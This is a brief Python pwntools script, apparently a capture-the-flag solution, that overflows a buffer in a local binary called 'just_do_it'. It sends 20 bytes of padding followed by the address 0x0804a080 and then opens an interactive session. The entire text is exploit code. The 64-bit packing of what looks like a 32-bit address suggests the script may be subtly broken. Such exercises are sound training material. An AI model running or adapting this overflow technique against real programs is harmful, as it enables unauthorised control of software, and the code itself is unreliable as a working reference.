from pwn import *

p = process('./just_do_it')

addr = 0x0804a080

payload = b"A" * 20
payload += p64(addr)

p.sendline(payload)

p.interactive()
